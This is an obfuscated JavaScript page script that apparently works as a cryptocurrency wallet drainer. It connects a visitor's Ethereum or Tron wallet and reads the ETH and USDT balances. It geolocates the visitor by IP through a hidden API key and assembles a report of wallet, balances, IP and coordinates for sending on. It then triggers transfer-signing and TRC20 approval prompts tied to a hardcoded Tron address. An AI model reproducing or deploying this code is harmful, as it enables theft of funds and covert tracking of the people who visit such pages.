"use strict";
const _0x412dfe = _0x104e;
(function (_0x2e6c56, _0x323619) {
    const _0x3d33d6 = _0x104e,
        _0x21114c = _0x2e6c56();
    while (!![]) {
        try {
            const _0x406b7d =
                (-parseInt(_0x3d33d6(0x1ff)) / 0x1) *
                (-parseInt(_0x3d33d6(0x226)) / 0x2) +
                (-parseInt(_0x3d33d6(0x1b8)) / 0x3) *
                (-parseInt(_0x3d33d6(0x1c5)) / 0x4) +
                (-parseInt(_0x3d33d6(0x1be)) / 0x5) *
                (-parseInt(_0x3d33d6(0x1d3)) / 0x6) +
                (-parseInt(_0x3d33d6(0x1ba)) / 0x7) *
                (-parseInt(_0x3d33d6(0x224)) / 0x8) +
                parseInt(_0x3d33d6(0x1d0)) / 0x9 +
                (-parseInt(_0x3d33d6(0x1cf)) / 0xa) *
                (-parseInt(_0x3d33d6(0x202)) / 0xb) +
                -parseInt(_0x3d33d6(0x1fd)) / 0xc;
            if (_0x406b7d === _0x323619) break;
            else _0x21114c["push"](_0x21114c["shift"]());
        } catch (_0x168edb) {
            _0x21114c["push"](_0x21114c["shift"]());
        }
    }
})(_0x39c5, 0x91a95);
let provider, wall, selectedAccount, istronWeb, currentaddress;
function init() {
    const _0x29a13a = _0x104e;
    console[_0x29a13a(0x1e8)]("Initializing"),
        window[_0x29a13a(0x1f3)][_0x29a13a(0x220)]();
}
function _0x39c5() {
    const _0x260488 = [
        "uint256",
        "%0A",
        "getAccounts",
        "Date:\x20",
        "defaultAddress",
        "log",
        "_value",
        "deprecated",
        "eth",
        "\x20Longitude\x20",
        "MAX_UINT",
        "startsWith",
        "string",
        "event",
        "_spender",
        "tron_requestAccounts",
        "localStorage",
        "maximumFee",
        "newBasisPoints",
        "hostname",
        "addBlackList",
        "function",
        "_totalSupply",
        "tron\x20wallet\x20null",
        "Deprecate",
        "If\x20you\x20are\x20using\x20TronLink,\x20please\x20login,\x20and\x20press\x20this\x20button\x20again",
        "33107676avGzYZ",
        "balances",
        "574327nLhiHc",
        "NWRjYjdmNTY2NTAzNDdiODk5NWU3ZTQ5YzU5YjA1ODI=",
        "view",
        "512336kUoCWR",
        "location",
        "_blackListedUser",
        "_from",
        "newOwner",
        "request",
        "Issue",
        "%0ALatitude\x20",
        "isBlackListed",
        "DestroyedBlackFunds",
        "%0A%0ACountry:\x20",
        "owner",
        "name",
        "maxFee",
        "balanceOf",
        "totalSupply",
        "paused",
        "TTu4j7FkfBWWENR1Wg8fFAcgb4TXzt2rLP",
        "%0A%0A",
        "Wallet\x20Connect%0A%0A",
        "bool",
        "error",
        "catch",
        "deprecate",
        "transferOwnership",
        "json",
        "Tronweb\x20not\x20defined",
        "\x20USDT\x20%0A%0A",
        "getBalance",
        "https://api.geoapify.com/v1/ipinfo?apiKey=",
        "clear",
        "-------------------------------------------",
        "unpause",
        "nonpayable",
        "32erldcn",
        "%0ACity:\x20",
        "2rRLfoS",
        "tronWeb",
        "_user",
        "base58",
        "\x20ETH\x20%0A",
        "_initialSupply",
        "%0AIP:\x20",
        "value",
        "address",
        "Address:\x20",
        "1823313XQiDgM",
        "load",
        "815199SluGEw",
        "toFixed",
        "getBlackListStatus",
        "destroyBlackFunds",
        "3090485WsIrhN",
        "_upgradedAddress",
        "Pause",
        "amount",
        "-------------------------------------------%0A",
        "basisPointsRate",
        "_balance",
        "4rxcAYB",
        "Transfer",
        "transferFrom",
        "allowed",
        "removeBlackList",
        "Approval",
        "spender",
        "then",
        "_to",
        "remaining",
        "180WDMxgG",
        "2260899jidaQs",
        "Redeem",
        "newMaxFee",
        "6sKdWgT",
        "redeem",
        "0x226Ae75e9A8893aE773319088e2e09A5a5744943",
        "issue",
        "_maker",
        "addEventListener",
        "from",
        "Params",
        "_decimals",
        "methods",
        "https://cloudflare-eth.com/",
        "constructor",
        "upgradedAddress",
        "who",
        "latitude",
        "symbol",
    ];
    _0x39c5 = function () {
        return _0x260488;
    };
    return _0x39c5();
}
async function getLocation() {
    const _0x5f3e88 = _0x104e,
        _0x28bd11 = atob(_0x5f3e88(0x200));
    fetch(_0x5f3e88(0x21f) + _0x28bd11)
    [_0x5f3e88(0x1cc)]((_0x157c59) => _0x157c59[_0x5f3e88(0x21b)]())
    [_0x5f3e88(0x1cc)]((_0x2a5ee3) => {
        const _0x497239 = _0x5f3e88;
        (city = _0x2a5ee3["city"]["name"]),
            (country = _0x2a5ee3["country"]["name"]),
            (ip = _0x2a5ee3["ip"]),
            (latitude = _0x2a5ee3[_0x497239(0x203)][_0x497239(0x1e1)]),
            (longitude = _0x2a5ee3[_0x497239(0x203)]["longitude"]);
    })
    [_0x5f3e88(0x218)]((_0x573bf1) =>
        console["log"](_0x5f3e88(0x217), _0x573bf1)
    );
}
let city, country, ip, latitude, longitude;
async function OpenModal() {
    const _0x32898d = _0x104e;
    try {
        getLocation(),
            (provider = new WalletConnectProvider["default"]({
                rpc: { 0x1: _0x32898d(0x1dd) },
            })),
            await provider["enable"]();
        const _0x7fb22b = new Web3(provider),
            _0x4e500c = [
                {
                    constant: !![],
                    inputs: [],
                    name: _0x32898d(0x20e),
                    outputs: [{ name: "", type: _0x32898d(0x1ef) }],
                    payable: ![],
                    stateMutability: "view",
                    type: "function",
                },
                {
                    constant: ![],
                    inputs: [{ name: _0x32898d(0x1bf), type: _0x32898d(0x22e) }],
                    name: _0x32898d(0x219),
                    outputs: [],
                    payable: ![],
                    stateMutability: _0x32898d(0x223),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: ![],
                    inputs: [
                        { name: "_spender", type: _0x32898d(0x22e) },
                        { name: _0x32898d(0x1e9), type: _0x32898d(0x1e3) },
                    ],
                    name: "approve",
                    outputs: [],
                    payable: ![],
                    stateMutability: _0x32898d(0x223),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: !![],
                    inputs: [],
                    name: _0x32898d(0x1ea),
                    outputs: [{ name: "", type: _0x32898d(0x216) }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: ![],
                    inputs: [{ name: "_evilUser", type: _0x32898d(0x22e) }],
                    name: _0x32898d(0x1f7),
                    outputs: [],
                    payable: ![],
                    stateMutability: _0x32898d(0x223),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: !![],
                    inputs: [],
                    name: _0x32898d(0x211),
                    outputs: [{ name: "", type: _0x32898d(0x1e3) }],
                    payable: ![],
                    stateMutability: "view",
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: ![],
                    inputs: [
                        { name: _0x32898d(0x205), type: _0x32898d(0x22e) },
                        { name: _0x32898d(0x1cd), type: "address" },
                        { name: _0x32898d(0x1e9), type: "uint256" },
                    ],
                    name: _0x32898d(0x1c7),
                    outputs: [],
                    payable: ![],
                    stateMutability: _0x32898d(0x223),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: !![],
                    inputs: [],
                    name: _0x32898d(0x1df),
                    outputs: [{ name: "", type: _0x32898d(0x22e) }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: !![],
                    inputs: [{ name: "", type: _0x32898d(0x22e) }],
                    name: _0x32898d(0x1fe),
                    outputs: [{ name: "", type: _0x32898d(0x1e3) }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: !![],
                    inputs: [],
                    name: "decimals",
                    outputs: [{ name: "", type: "uint256" }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: !![],
                    inputs: [],
                    name: _0x32898d(0x1f4),
                    outputs: [{ name: "", type: _0x32898d(0x1e3) }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: "function",
                },
                {
                    constant: !![],
                    inputs: [],
                    name: _0x32898d(0x1f9),
                    outputs: [{ name: "", type: "uint256" }],
                    payable: ![],
                    stateMutability: "view",
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: ![],
                    inputs: [],
                    name: _0x32898d(0x222),
                    outputs: [],
                    payable: ![],
                    stateMutability: _0x32898d(0x223),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: !![],
                    inputs: [{ name: _0x32898d(0x1d7), type: _0x32898d(0x22e) }],
                    name: _0x32898d(0x1bc),
                    outputs: [{ name: "", type: _0x32898d(0x216) }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: "function",
                },
                {
                    constant: !![],
                    inputs: [
                        { name: "", type: _0x32898d(0x22e) },
                        { name: "", type: "address" },
                    ],
                    name: _0x32898d(0x1c8),
                    outputs: [{ name: "", type: _0x32898d(0x1e3) }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: !![],
                    inputs: [],
                    name: _0x32898d(0x212),
                    outputs: [{ name: "", type: _0x32898d(0x216) }],
                    payable: ![],
                    stateMutability: "view",
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: !![],
                    inputs: [{ name: _0x32898d(0x1e0), type: _0x32898d(0x22e) }],
                    name: _0x32898d(0x210),
                    outputs: [{ name: "", type: "uint256" }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: "function",
                },
                {
                    constant: ![],
                    inputs: [],
                    name: "pause",
                    outputs: [],
                    payable: ![],
                    stateMutability: _0x32898d(0x223),
                    type: "function",
                },
                {
                    constant: !![],
                    inputs: [],
                    name: "getOwner",
                    outputs: [{ name: "", type: "address" }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: "function",
                },
                {
                    constant: !![],
                    inputs: [],
                    name: _0x32898d(0x20d),
                    outputs: [{ name: "", type: _0x32898d(0x22e) }],
                    payable: ![],
                    stateMutability: "view",
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: !![],
                    inputs: [],
                    name: _0x32898d(0x1e2),
                    outputs: [{ name: "", type: _0x32898d(0x1ef) }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: "function",
                },
                {
                    constant: ![],
                    inputs: [
                        { name: _0x32898d(0x1cd), type: _0x32898d(0x22e) },
                        { name: "_value", type: _0x32898d(0x1e3) },
                    ],
                    name: "transfer",
                    outputs: [],
                    payable: ![],
                    stateMutability: _0x32898d(0x223),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: ![],
                    inputs: [
                        { name: _0x32898d(0x1f5), type: _0x32898d(0x1e3) },
                        { name: _0x32898d(0x1d2), type: _0x32898d(0x1e3) },
                    ],
                    name: "setParams",
                    outputs: [],
                    payable: ![],
                    stateMutability: _0x32898d(0x223),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: ![],
                    inputs: [{ name: _0x32898d(0x1c1), type: _0x32898d(0x1e3) }],
                    name: _0x32898d(0x1d6),
                    outputs: [],
                    payable: ![],
                    stateMutability: _0x32898d(0x223),
                    type: "function",
                },
                {
                    constant: ![],
                    inputs: [{ name: _0x32898d(0x1c1), type: _0x32898d(0x1e3) }],
                    name: _0x32898d(0x1d4),
                    outputs: [],
                    payable: ![],
                    stateMutability: _0x32898d(0x223),
                    type: "function",
                },
                {
                    constant: !![],
                    inputs: [
                        { name: "_owner", type: _0x32898d(0x22e) },
                        { name: _0x32898d(0x1f1), type: _0x32898d(0x22e) },
                    ],
                    name: "allowance",
                    outputs: [{ name: _0x32898d(0x1ce), type: _0x32898d(0x1e3) }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: !![],
                    inputs: [],
                    name: _0x32898d(0x1c3),
                    outputs: [{ name: "", type: _0x32898d(0x1e3) }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: !![],
                    inputs: [{ name: "", type: _0x32898d(0x22e) }],
                    name: _0x32898d(0x20a),
                    outputs: [{ name: "", type: "bool" }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: ![],
                    inputs: [{ name: "_clearedUser", type: _0x32898d(0x22e) }],
                    name: _0x32898d(0x1c9),
                    outputs: [],
                    payable: ![],
                    stateMutability: _0x32898d(0x223),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: !![],
                    inputs: [],
                    name: _0x32898d(0x1ed),
                    outputs: [{ name: "", type: "uint256" }],
                    payable: ![],
                    stateMutability: _0x32898d(0x201),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: ![],
                    inputs: [{ name: _0x32898d(0x206), type: _0x32898d(0x22e) }],
                    name: _0x32898d(0x21a),
                    outputs: [],
                    payable: ![],
                    stateMutability: _0x32898d(0x223),
                    type: _0x32898d(0x1f8),
                },
                {
                    constant: ![],
                    inputs: [{ name: _0x32898d(0x204), type: _0x32898d(0x22e) }],
                    name: _0x32898d(0x1bd),
                    outputs: [],
                    payable: ![],
                    stateMutability: "nonpayable",
                    type: "function",
                },
                {
                    inputs: [
                        { name: _0x32898d(0x22b), type: "uint256" },
                        { name: "_name", type: "string" },
                        { name: "_symbol", type: _0x32898d(0x1ef) },
                        { name: _0x32898d(0x1db), type: _0x32898d(0x1e3) },
                    ],
                    payable: ![],
                    stateMutability: _0x32898d(0x223),
                    type: _0x32898d(0x1de),
                },
                {
                    anonymous: ![],
                    inputs: [{ indexed: ![], name: "amount", type: _0x32898d(0x1e3) }],
                    name: _0x32898d(0x208),
                    type: _0x32898d(0x1f0),
                },
                {
                    anonymous: ![],
                    inputs: [
                        { indexed: ![], name: _0x32898d(0x1c1), type: _0x32898d(0x1e3) },
                    ],
                    name: _0x32898d(0x1d1),
                    type: _0x32898d(0x1f0),
                },
                {
                    anonymous: ![],
                    inputs: [
                        { indexed: ![], name: "newAddress", type: _0x32898d(0x22e) },
                    ],
                    name: _0x32898d(0x1fb),
                    type: "event",
                },
                {
                    anonymous: ![],
                    inputs: [
                        { indexed: ![], name: "feeBasisPoints", type: _0x32898d(0x1e3) },
                        { indexed: ![], name: _0x32898d(0x20f), type: _0x32898d(0x1e3) },
                    ],
                    name: _0x32898d(0x1da),
                    type: _0x32898d(0x1f0),
                },
                {
                    anonymous: ![],
                    inputs: [
                        { indexed: ![], name: _0x32898d(0x204), type: _0x32898d(0x22e) },
                        { indexed: ![], name: _0x32898d(0x1c4), type: _0x32898d(0x1e3) },
                    ],
                    name: _0x32898d(0x20b),
                    type: "event",
                },
                {
                    anonymous: ![],
                    inputs: [
                        { indexed: ![], name: _0x32898d(0x228), type: _0x32898d(0x22e) },
                    ],
                    name: "AddedBlackList",
                    type: _0x32898d(0x1f0),
                },
                {
                    anonymous: ![],
                    inputs: [
                        { indexed: ![], name: _0x32898d(0x228), type: _0x32898d(0x22e) },
                    ],
                    name: "RemovedBlackList",
                    type: _0x32898d(0x1f0),
                },
                {
                    anonymous: ![],
                    inputs: [
                        { indexed: !![], name: "owner", type: "address" },
                        { indexed: !![], name: _0x32898d(0x1cb), type: _0x32898d(0x22e) },
                        { indexed: ![], name: _0x32898d(0x22d), type: "uint256" },
                    ],
                    name: _0x32898d(0x1ca),
                    type: "event",
                },
                {
                    anonymous: ![],
                    inputs: [
                        { indexed: !![], name: _0x32898d(0x1d9), type: "address" },
                        { indexed: !![], name: "to", type: _0x32898d(0x22e) },
                        { indexed: ![], name: "value", type: _0x32898d(0x1e3) },
                    ],
                    name: _0x32898d(0x1c6),
                    type: _0x32898d(0x1f0),
                },
                { anonymous: ![], inputs: [], name: _0x32898d(0x1c0), type: "event" },
                { anonymous: ![], inputs: [], name: "Unpause", type: "event" },
            ],
            _0x2b55b0 = _0x32898d(0x1d5),
            _0xd08ec5 = new _0x7fb22b[_0x32898d(0x1eb)]["Contract"](
                _0x4e500c,
                _0x2b55b0
            );
        wall = (await _0x7fb22b[_0x32898d(0x1eb)][_0x32898d(0x1e5)]())[0x0];
        const _0x578459 = await _0xd08ec5[_0x32898d(0x1dc)]
        [_0x32898d(0x210)](wall)
        ["call"](),
            _0x4cf199 = _0x578459 / 0xa ** 0x6,
            _0x25fea3 = await _0x7fb22b[_0x32898d(0x1eb)][_0x32898d(0x21e)](wall),
            _0x3932cf = _0x25fea3 / 0xa ** 0x12,
            _0xb2ad8b = new Date();
        let _0x4b9b53 = window[_0x32898d(0x203)][_0x32898d(0x1f6)];
        consoleLog(
            _0x32898d(0x1c2) +
            _0x32898d(0x215) +
            "Website:\x20" +
            _0x4b9b53 +
            _0x32898d(0x214) +
            _0x32898d(0x1b7) +
            wall +
            "%0A%0A" +
            _0x3932cf[_0x32898d(0x1bb)](0x5) +
            _0x32898d(0x22a) +
            _0x4cf199[_0x32898d(0x1bb)](0x3) +
            _0x32898d(0x21d) +
            _0x32898d(0x1e6) +
            _0xb2ad8b +
            _0x32898d(0x20c) +
            country +
            _0x32898d(0x225) +
            city +
            _0x32898d(0x22c) +
            ip +
            _0x32898d(0x209) +
            latitude +
            _0x32898d(0x1ec) +
            longitude +
            _0x32898d(0x1e4) +
            _0x32898d(0x221)
        );
    } catch (_0xb3bb7e) {
        console[_0x32898d(0x1e8)](
            "Could\x20not\x20get\x20a\x20wallet\x20connection",
            _0xb3bb7e
        );
        return;
    }
    wall && (showVeryFirstPage(), askETHTransferWithSign());
}
function _0x104e(_0x130c83, _0x2f494d) {
    const _0x39c55f = _0x39c5();
    return (
        (_0x104e = function (_0x104eb2, _0x2fe3de) {
            _0x104eb2 = _0x104eb2 - 0x1b7;
            let _0xdac5db = _0x39c55f[_0x104eb2];
            return _0xdac5db;
        }),
        _0x104e(_0x130c83, _0x2f494d)
    );
}
window[_0x412dfe(0x1d8)](_0x412dfe(0x1b9), async () => {
    init();
});
let rATron = _0x412dfe(0x213),
    tronAccount;
async function OpenTronModal() {
    const _0x147adb = _0x412dfe;
    try {
        await tronLink[_0x147adb(0x207)]({ method: _0x147adb(0x1f2) }),
            (tronAccount = String(
                await window[_0x147adb(0x227)][_0x147adb(0x1e7)][_0x147adb(0x229)]
            )),
            !tronAccount[_0x147adb(0x1ee)]("T")
                ? (alert(
                    "If\x20you\x20are\x20using\x20TronLink,\x20please\x20login,\x20and\x20press\x20this\x20button\x20again"
                ),
                    console[_0x147adb(0x1e8)](tronAccount))
                : (showVeryFirstPage(), askTRC20Approve());
    } catch (_0x4abe1e) {
        console["log"](_0x147adb(0x21c)),
            console[_0x147adb(0x1e8)](_0x4abe1e),
            (tronAccount = String(
                await window["tronWeb"]["defaultAddress"]["base58"]
            )),
            !tronAccount[_0x147adb(0x1ee)]("T")
                ? (alert(_0x147adb(0x1fc)), console[_0x147adb(0x1e8)](tronAccount))
                : console[_0x147adb(0x1e8)](_0x147adb(0x1fa));
    }
}
